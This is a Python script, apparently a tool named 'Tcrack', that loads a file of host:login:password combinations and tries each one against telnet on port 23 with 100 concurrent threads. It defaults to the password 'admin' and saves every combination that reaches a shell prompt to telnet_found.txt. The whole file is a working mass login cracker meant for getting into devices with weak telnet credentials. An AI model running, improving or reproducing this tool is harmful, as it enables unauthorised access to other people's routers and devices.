import telnetlib
import os
import sys
import concurrent.futures

telnets = []

def banner():

  print("""
  
 /$$$$$$$$                                     /$$      
|__  $$__/                                    | $$      
   | $$  /$$$$$$$  /$$$$$$  /$$$$$$   /$$$$$$$| $$   /$$
   | $$ /$$_____/ /$$__  $$|____  $$ /$$_____/| $$  /$$/
   | $$| $$      | $$  \__/ /$$$$$$$| $$      | $$$$$$/ 
   | $$| $$      | $$      /$$__  $$| $$      | $$_  $$ 
   | $$|  $$$$$$$| $$     |  $$$$$$$|  $$$$$$$| $$ \  $$
   |__/ \_______/|__/      \_______/ \_______/|__/  \__/
                                                                                                                                                                                                             
  """)
  
def main_function(combos): 
      
   a = []
   b = combos.split(":")
   host = b[0]

   print("[*] Trying: " + host + " " +b[1]+ ":" + b[2].strip()) 

   login = b[1] +"\n"

   if len(b) == 2:
     password = "admin\n"
   else:
     password = b[2].strip() + "\n"

   login = login.encode('utf-8')
   password = password.encode('utf-8')

   tn = telnetlib.Telnet(host, 23, timeout=10)
   tn.read_until(b"ogin: ")
   tn.write(login)
   tn.read_until(b"ssword: ")
   tn.write(password)

   response = tn.read_until(b"$")

   if b"$" in response: #or b"#" in response: 
    
    login = login.decode('utf-8').strip()
    password = password.decode('utf-8')

    output = open('telnet_found.txt', 'a')
    output.write(host+":"+login+":"+password)
    output.close()

def load_domains(domains):

  count = 0
  with open(domains) as file:
    lines = file.readlines()
    for line in lines:
      count = count + 1
      print ("[*] Loading lines: " + str(count))
      telnets.append(line)
  

if len(sys.argv) != 2:
       os.system("clear")
       banner()
       print("Usage: "+ sys.argv[0] + " telnets.txt\n\n") 
else:

   load_domains(sys.argv[1])
   with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    executor.map(main_function, telnets)
